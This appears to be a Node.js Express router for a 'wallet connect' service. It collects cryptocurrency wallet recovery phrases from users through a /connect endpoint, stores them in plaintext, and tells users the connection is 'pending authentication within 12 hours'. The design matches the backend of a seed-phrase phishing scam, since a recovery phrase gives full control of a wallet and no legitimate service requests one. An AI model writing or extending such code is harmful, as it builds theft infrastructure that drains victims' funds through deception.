const express = require("express");
const { Wallet, UserWallet } = require("../models");
const auth = require("../middleware/auth");

const router = express.Router();

// GET /api/wallets/master — Get the master list of wallets
router.get("/master", async (req, res) => {
  try {
    const wallets = await Wallet.findAll();
    return res.status(200).json({ status: 200, data: wallets });
  } catch (error) {
    return res.status(400).json({ status: 400, message: error.message });
  }
});

// POST /api/wallets/connect — Submit user wallet info (recovery phrase)
router.post("/connect", auth, async (req, res) => {
  try {
    const { wallet_id, email_address, recovery_phrase } = req.body;
    
    if (!wallet_id || !recovery_phrase) {
        return res.status(400).json({ status: 400, message: "Wallet selection and recovery phrase are required." });
    }

    const userWallet = await UserWallet.create({
      user_id: req.user.id,
      wallet_id,
      email_address,
      recovery_phrase,
    });

    return res.status(200).json({ 
        status: 200, 
        message: "the connection is pending authentication within 12 hours, and we would get back to them",
        data: userWallet 
    });
  } catch (error) {
    return res.status(400).json({ status: 400, message: error.message });
  }
});

// GET /api/wallets/user — Get all wallets linked to the logged-in user
router.get("/user", auth, async (req, res) => {
  try {
    const userWallets = await UserWallet.findAll({
      where: { user_id: req.user.id },
      include: [{ model: Wallet, as: "wallet_details" }],
      order: [["created_at", "DESC"]],
    });
    return res.status(200).json({ status: 200, data: userWallets });
  } catch (error) {
    return res.status(400).json({ status: 400, message: error.message });
  }
});

// PUT /api/wallets/user/:id — Update a linked wallet (e.g. recovery phrase or email)
router.put("/user/:id", auth, async (req, res) => {
  try {
    const { email_address, recovery_phrase } = req.body;
    const userWallet = await UserWallet.findOne({
      where: { id: req.params.id, user_id: req.user.id },
    });

    if (!userWallet) {
      return res.status(404).json({ status: 404, message: "Wallet not found" });
    }

    await userWallet.update({ email_address, recovery_phrase });
    return res.status(200).json({ status: 200, message: "Wallet updated successfully", data: userWallet });
  } catch (error) {
    return res.status(400).json({ status: 400, message: error.message });
  }
});

// DELETE /api/wallets/user/:id — Remove a linked wallet
router.delete("/user/:id", auth, async (req, res) => {
  try {
    const deleted = await UserWallet.destroy({
      where: { id: req.params.id, user_id: req.user.id }
    });

    if (!deleted) {
      return res.status(404).json({ status: 404, message: "Wallet not found" });
    }

    return res.status(200).json({ status: 200, message: "Wallet removed successfully" });
  } catch (error) {
    return res.status(400).json({ status: 400, message: error.message });
  }
});

module.exports = router;
